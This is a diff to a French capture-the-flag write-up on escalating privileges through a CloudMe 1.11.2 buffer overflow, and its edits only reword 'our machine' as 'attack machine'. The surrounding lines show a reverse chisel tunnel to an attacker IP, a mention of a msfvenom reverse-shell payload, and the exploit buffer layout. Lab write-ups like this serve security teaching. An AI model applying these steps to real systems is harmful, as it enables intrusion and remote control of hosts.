@@ -255,14 +255,14 @@ L'installeur `CloudMe_1112.exe` confirme la version **1.11.2** - cette version e
 
 Le principe : CloudMe écoute sur le port 8888 en local. L'exploit envoie un buffer surdimensionné qui écrase l'adresse de retour (EIP) et redirigé l'exécution vers un shellcode (reverse shell). Comme le service tourne avec des privilèges élevés, on obtient un shell administrator.
 
-Le problème : le port 8888 n'est accessible qu'en localhost sur la box. Il faut donc un tunnel pour l'atteindre depuis notre machine.
+Le problème : le port 8888 n'est accessible qu'en localhost sur la box. Il faut donc un tunnel pour l'atteindre depuis la machine d'attaque.
 
 **1. Transfert de chisel sur la box :**
 
 Chisel est un outil de tunneling TCP sur HTTP. Il faut transférer le binaire Windows sur la box.
 
 ```bash
-# Sur notre machine - télécharger chisel pour macOS et Windows
+# Sur la machine d'attaque - télécharger chisel pour macOS et Windows
 curl -L -o /tmp/chisel_mac.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_darwin_arm64.gz
 curl -L -o /tmp/chisel_win.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
 gunzip /tmp/chisel_mac.gz && chmod +x /tmp/chisel_mac
@@ -270,7 +270,7 @@ gunzip /tmp/chisel_win.gz && mv /tmp/chisel_win /tmp/chisel.exe
 ```
 
 ```bash
-# Sur notre machine - servir chisel.exe via HTTP
+# Sur la machine d'attaque - servir chisel.exe via HTTP
 cd /tmp && python3 -m http.server 8000
 ```
 
@@ -285,7 +285,7 @@ Note : `certutil -urlcache` retournait "Access is denied" - Windows Defender ou 
 **2. Mise en place du tunnel chisel :**
 
 ```bash
-# Terminal 1 - notre machine : lancer le serveur chisel en mode reverse
+# Terminal 1 - machine d'attaque : lancer le serveur chisel en mode reverse
 /tmp/chisel_mac server --reverse -p 9999
 ```
 
@@ -294,12 +294,12 @@ Note : `certutil -urlcache` retournait "Access is denied" - Windows Defender ou 
 C:\Users\shaun\Downloads\chisel.exe client 10.10.14.182:9999 R:8888:127.0.0.1:8888
 ```
 
-Ce tunnel fait en sorte que notre `localhost:8888` soit redirigé vers `127.0.0.1:8888` sur la box. On peut désormais atteindre CloudMe depuis notre machine.
+Ce tunnel fait en sorte que le `localhost:8888` de la machine d'attaque soit redirigé vers `127.0.0.1:8888` sur la box. CloudMe est désormais accessible depuis la machine d'attaque.
 
 Schéma du tunnel :
 
 ```
-Notre machine :8888 ──── chisel tunnel ──→ Box 127.0.0.1:8888 (CloudMe)
+Machine d'attaque :8888 ──── chisel tunnel ──→ Box 127.0.0.1:8888 (CloudMe)
 ```
 
 **3. Génération du payload msfvenom :**
@@ -347,7 +347,7 @@ except Exception as e:
 
 Structure du buffer :
 - `padding1` (1052 octets de NOP) : remplit le buffer jusqu'à l'adresse de retour
-- `EIP` : écrase l'adresse de retour avec un gadget `PUSH ESP; RET` qui redirigé vers notre shellcode
+- `EIP` : écrase l'adresse de retour avec un gadget `PUSH ESP; RET` qui redirige vers le shellcode
 - `NOPS` (30 octets) : NOP sled pour atterrir proprement dans le shellcode
 - `payload` : le shellcode reverse shell généré par msfvenom
 - `overrun` : padding pour atteindre la taille totale de 1500 octets
